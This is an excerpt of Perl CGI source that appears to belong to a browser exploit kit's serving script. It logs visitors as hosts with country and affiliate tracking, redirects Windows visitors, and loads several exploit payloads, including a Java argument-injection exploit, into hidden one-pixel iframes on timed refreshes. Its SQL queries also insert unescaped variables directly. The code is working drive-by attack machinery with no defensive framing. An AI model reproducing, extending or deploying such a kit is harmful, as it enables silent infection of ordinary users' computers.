...
$sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'hybrid.pl', 'HoneyPot')";
...
if($os eq 'Windows')
{
  ...
  $jcheckopt = $dbh->selectrow_array("SELECT check_crash FROM options WHERE username='$username'") . "<br>\n";
  $chkchkxpl = 'yes' if($jcheckopt =~ "yes");
  $timebeforechk = $dbh->selectrow_array("SELECT time_bxpl FROM options WHERE username='$username'");

  $urlrefresh = 'hybrid.pl?run=1&timecheck=' . $timebeforechk . '&csname=' . $csname . '&ip=' . $ip_number . '&chkchkxpl=' . $chkchkxpl . '&aff=' . $aff . '&xplld=' . $exploitstringtoload . '&flavor=' . $flavor;
  print "Status: 301 Moved\nLocation: $urlrefresh\n\n";
}
...
if($run eq "1")
{
  ...
  {
    $showxplnumber = $dbh->selectrow_array("SELECT showxpl FROM options WHERE username='$username'");
    if($showxplnumber eq '2')
    {
      $exploitnow1 = $xploitserve[0];
      $exploitnow2 = $xploitserve[1];
      $exploitstringtoload =~ s/$exploitnow1://eg;
      $exploitstringtoload =~ s/$exploitnow2://eg;
    
      #set wait time to 3 if java argument inject is involved
      if($exploitnow1 eq 'java_arginject.pl' or $exploitnow2 eq 'java_arginject.pl')
      {
        $timebeforechk2 = '3';
      }
      else
      ...
      print '<html>' . "\n";
      print '<head>' . "\n";
      print '<meta http-equiv="Refresh" content="' . $timebeforechk2 . '; url=hybrid.pl?run=1&timecheck=' . $timebeforechk . '&csname=' . $csname . '&ip=' . $ip_number . '&chkchkxpl=' . $chkchkxpl . '&aff=' . $aff . '&xplld=' . $exploitstringtoload . '&flavor=' . $flavor . '" />';
      print '</head>' . "\n";
      print '<body>' . "\n";
      #print $exploitstringtoload . "\n"; #debug
      print '<iframe src="exploits/' . $exploitnow1 . '?aff=' . $aff . '&csname=' . $csname . '&flavor=' . $flavor . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>' . "\n";
      print '<iframe src="exploits/' . $exploitnow2 . '?aff=' . $aff . '&csname=' . $csname . '&flavor=' . $flavor . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>' . "\n" if($exploitnow2 ne ':' or $exploitnow2 ne '');
      print '</body>' . "\n";
      print '</html>' . "\n";
    }
    if($showxplnumber eq '3')
    {
      $exploitnow1 = $xploitserve[0];
      $exploitnow2 = $xploitserve[1];
      $exploitnow3 = $xploitserve[2];
      $exploitstringtoload =~ s/$exploitnow1://eg;
      $exploitstringtoload =~ s/$exploitnow2://eg;
      $exploitstringtoload =~ s/$exploitnow3://eg;
      ...
      print '<iframe src="exploits/' . $exploitnow1 . '?aff=' . $aff . '&csname=' . $csname . '&flavor=' . $flavor . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>' . "\n";
      print '<iframe src="exploits/' . $exploitnow2 . '?aff=' . $aff . '&csname=' . $csname . '&flavor=' . $flavor . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>' . "\n" if($exploitnow2 ne ':' or $exploitnow2 ne '');
      print '<iframe src="exploits/' . $exploitnow3 . '?aff=' . $aff . '&csname=' . $csname . '&flavor=' . $flavor . '"  marginwidth="1px" align="center" frameborder="0" height="1" scrolling="no" width="1"></iframe>' . "\n" if($exploitnow3 ne ':' or $exploitnow3 ne '');
      print '</body>' . "\n";
      print '</html>' . "\n";
    }
  }
